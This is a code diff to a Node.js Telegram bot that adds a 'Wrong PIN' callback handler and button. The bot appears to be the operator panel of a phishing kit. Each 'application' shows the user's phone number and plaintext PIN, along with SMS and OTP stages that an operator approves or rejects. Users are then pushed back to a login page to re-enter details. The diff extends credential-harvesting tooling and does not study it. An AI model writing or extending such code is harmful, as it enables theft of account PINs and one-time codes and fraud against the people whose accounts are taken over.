@@ -1933,6 +1933,33 @@ ${app.smsMessage || 'N/A'}
         await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected. User asked to paste correct message.' });
     }
 
+    // wrongpin_sms_
+    else if (data.startsWith('wrongpin_sms_')) {
+        const p     = data.split('_');
+        const appId = p[3];
+        const app   = await db.getApplication(appId);
+        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+
+        await db.updateApplication(appId, { pinStatus: 'rejected' });
+        console.log(`❌ WRONG PIN (SMS stage) for ${appId}`);
+
+        await bot.editMessageText(`
+🔑 *WRONG PIN — REJECTED*
+
+📋 `${appId}`
+📞 `${formatPhone(app.phoneNumber)}`
+🔑 PIN: `${app.pin}`
+
+⚠️ User entered the wrong PIN
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+✓ User will be sent back to the login page
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🔑 Wrong PIN. User returned to login page.' });
+    }
+
     // approve_otp_
     else if (data.startsWith('approve_otp_')) {
         const p     = data.split('_');
@@ -2208,6 +2235,7 @@ ${smsMessage}
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
+                    [{ text: '🔑 Wrong PIN',        callback_data: `wrongpin_sms_${application.adminId}_${applicationId}` }],
                     [{ text: '❌ Invalid Message',  callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
                     [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
                 ]
